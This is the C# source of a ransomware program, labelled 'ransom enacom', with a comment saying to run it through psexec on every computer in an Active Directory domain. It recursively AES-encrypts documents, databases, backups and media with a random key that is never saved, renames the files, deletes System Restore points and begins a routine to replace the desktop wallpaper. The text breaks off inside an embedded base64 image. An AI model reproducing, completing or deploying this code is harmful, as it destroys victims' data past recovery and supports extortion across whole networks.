/*
  ransom enacom 
  run as AD psexec foreach computers hostname
*/

using System;
using Microsoft.Win32;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Management;
using System.Runtime.InteropServices;

namespace madeinargentina
{
	class Program
	{
		const int SPI_SETDESKWALLPAPER = 20;
		const int SPIF_UPDATEINIFILE = 0x01;
		const int SPIF_SENDWININICHANGE = 0x02;

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

		public static string generar_pass(int t){
			StringBuilder s = new StringBuilder ();
			Random r = new Random ();
			char c;
			for (int i = 0; i < t; i++) {
				c = Convert.ToChar(Convert.ToInt32(Math.Floor( 56 * r.NextDouble() + 128)));
				s.Append (c);
			}
			return s.ToString ();
		}

		public static void doit(string target){
			string pass = generar_pass (128);
			byte[] passb = Encoding.UTF8.GetBytes (pass);
			passb = SHA256.Create ().ComputeHash (passb);

			byte[] jmp = new byte[] { 3, 5, 7, 11, 13, 17, 19, 23 };
			using (FileStream fs = new FileStream(target, FileMode.OpenOrCreate, FileAccess.Write)) {
				using (RijndaelManaged AES = new RijndaelManaged()) {
					AES.KeySize = 256;
					AES.BlockSize = 128;
					var key = new Rfc2898DeriveBytes (passb, jmp, 1000);
					AES.Key = key.GetBytes (AES.KeySize / 8);
					AES.IV = key.GetBytes (AES.BlockSize / 8);
					AES.Mode = CipherMode.CBC;
					using (var cs = new CryptoStream(fs, AES.CreateEncryptor(), CryptoStreamMode.Write)) {
						using (FileStream ip = new FileStream(target, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
							int d;
							int mbe = 100 * 1024 * 1024;
							int bn = 0;
							while ((d = ip.ReadByte()) != -1 && bn < mbe) {
								cs.WriteByte ((byte)d);
								bn++;
							}
							ip.Close ();
						}
						cs.Close ();
					}
				}
				fs.Close ();
			}
			File.Move (target, target + ".s");
		}

		public static void doitdir(string dir){
		    string[] ext = {".txt", ".pdf", ".mp4", ".mp3", ".csv", ".xml",".docx", ".doc", ".xls", ".xlsx", ".odt", ".php", ".html", ".htm", ".asp", ".aspx", ".jpg", ".jpeg", ".png", ".sql", ".back", ".backup", ".ppt", ".pptx", ".gif", ".rtf", ".zip", ".rar", ".log", ".db", ".sqlite", ".wav", ".tar.gz", ".iso"};

			foreach (string f in Directory.GetFiles(dir)) {
				string extension = Path.GetExtension (f);
				foreach (string k in ext) {
					if (k.Contains (extension)) {
						new Task (() => {
							doit (f); 
						});
					}
				}
			}

			foreach (string d in Directory.GetDirectories(dir)) {
				doitdir (d);
			}
		}

		[DllImport("Srclient.dll")]
		public static extern int DeleteRestorePoint(int index);

		public static void byebye(){
			System.Management.ManagementClass objClass = new System.Management.ManagementClass("\\\\.\\root\\default", "systemrestore", new System.Management.ObjectGetOptions());
			System.Management.ManagementObjectCollection objCol = objClass.GetInstances();
			String[] sequencenums = new String[100]; 
			int c = 0;
			foreach (System.Management.ManagementObject objItem in objCol)
			{
				sequencenums[c] = (((uint)objItem["sequencenumber"]).ToString());
				c++;
			}

			while (c >= 0)
			{
				DeleteRestorePoint(Convert.ToInt32(sequencenums[c]));
				c--;
			}
		}

		public static void fondo()
		{
			string imgb64 = "iVBORw0KGgoAAAANSUhEUgAAAoAAAAHgCAMAAAACDyzWAAACalBMVEUAAAAbAADIAADNAACiAAATAAADAACWAACEAAAHAABKAABhAAACAAAFAACuAABIAABFAAAgAAAsAAAfAAClAAA8AAA7AAB0AAAzAAArAACIAAC/AACyAAAXAACcAAC+AACfAABeAAAJAAAUAABzAADHAABUAAAGAACmAAAnAABSAAB2AABHAADBAAAKAACeAABMAAC8AACGAAA0AACbAACkAABgAAAtAADJAAANAAB7AACHAACtAABEAAABAACdAABcAACnAAAmAADFAAAOAABqAABoAABZAABjAACDAAB9AAC2AADAAAALAACRAAApAAAPAABXAACNAAAvAAASAAAxAABbAACaAACCAAAiAAC4AADCAACAAABtAABGAABmAACSAAAMAAC3AADKAACXAABnAACTAACFAABxAAA4AACsAAAEAABrAAB/AAAaAACJAABAAACjAACgAAB5AACxAAAIAAC7AADGAAA1AAAkAAAeAAAhAABlAACrAABBAAB8AACOAAAQAADMAACQAAA/AADLAACvAAAoAABLAACwAAA2AAC1AACzAACqAAAqAABDAAAyAAAWAAChAACPAAC0AAC6AAAdAADEAABOAAAcAAB6AAAYAABYAABfAABwAAA6AACBAAAjAAA3AAB1AACMAACYAADDAABQAAA+AABCAACUAAAZAACLAACZAAByAABdAABaAABJAABVAABuAABsAABpAACKAAC9AABTAAARAAAwAAC5AAA9AABvAACVAACoAABiAABRAAAVAAAlAABNAACpAAA5AAB4AAB+AAB3AAAuAABPAABkAABWAAAUe30hAAAAB3RJTUUH4wsdACUb6zFk1AAAABV0RVh0U29mdHdhcmUAWFBhaW50IDIuOS4xVg2mGwAAIABJREFUeJztnYmbFEW29hMCG9BqHEGwmm4EWqAAoQBZRIUCBBGaxlHBQRuRXRhapRVoFscF21YRWQQEYRgEVNwQXEZndJxxnO3eufd+/9OXJyKXWDOzytYqhvf3PB2dkRnLiRNvVeVSdcLzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCPpldvxvpcU20rwNVKXV/G+vWvthXgquVaxq7LVduILNQPYD7X8/QX1TYG9Bg3DBxU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